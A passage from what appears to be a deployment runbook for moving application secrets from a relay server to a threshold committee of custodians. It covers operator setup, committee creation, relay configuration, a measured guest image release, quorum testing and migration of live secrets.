   - funds the operator address with a little Base ETH;
   - serves `custodian-daemon.mjs serve` behind TLS on 443 (a certificate from Let's Encrypt or ZeroSSL: the guest pins
     ISRG and Sectigo roots), with `CUSTODY_RPCS` naming at least two independent providers.
5. **Create the committee.** Any account calls `createCommittee(salt, t, members)` with the operators' `{operator,
   encKey, endpoint}`. Set `CUSTODY_COMMITTEE` in `site/js/core/config.js` to the resulting id (site deploy).
6. **Relay.**
   - Add `CUSTODY_VAULT`, `CUSTODY_CHAIN_ID=8453` and (optionally) `CUSTODY_RPCS` to `/etc/nan-relay/api-relay.env`.
   - Make sure each deployment moving to custody is in `SECRETS_RELEASE_DEPLOYMENTS` (§3.5).
   - Deploy relay/ (it ships `custody-state.mjs`; `deploy.sh` names it).
   - Restart in a gap between predictions.
   - Check: `POST /v1/secrets/exists` for a non-custody id still answers as before.
7. **Guest image.**
   - Build a domain release with this front (it adds `isolation/m2/custody` and the custody-auth client) and with
     guestd's custody-auth service (`-custody-auth-port 9445`).
   - Measure it and pin it in the predictor's release set.
   - This is a measured-image change: it cuts a release.
8. **metal0 supervisor:** set `CUSTODY_VAULT`. Its pump then signs custody bindings.
9. **First deployment, hardware verification (B1).**
   - On a test deployment owned by a clean key (never `0x3977…` or `0x337E…`): `enclave custody set … --rules-from-relay`.
   - Restart it on metal0 and check the guest console for `DOM custody: … from a threshold of t of n custodians` and
     the custodians' logs for `release … OK`.
   - Then stop one custodian, and later `t`, and confirm the guest refuses to start the app with no quorum.
10. **Migrate live secrets.** Per deployment, each owner: `enclave custody migrate`, then rotate the credentials. When
    no deployment's secrets remain relay-held, remove `SECRETS_KEY` from the relay env and retire `/v1/secrets/fetch`.
    Only then does the relay hold no decryption capability at all.
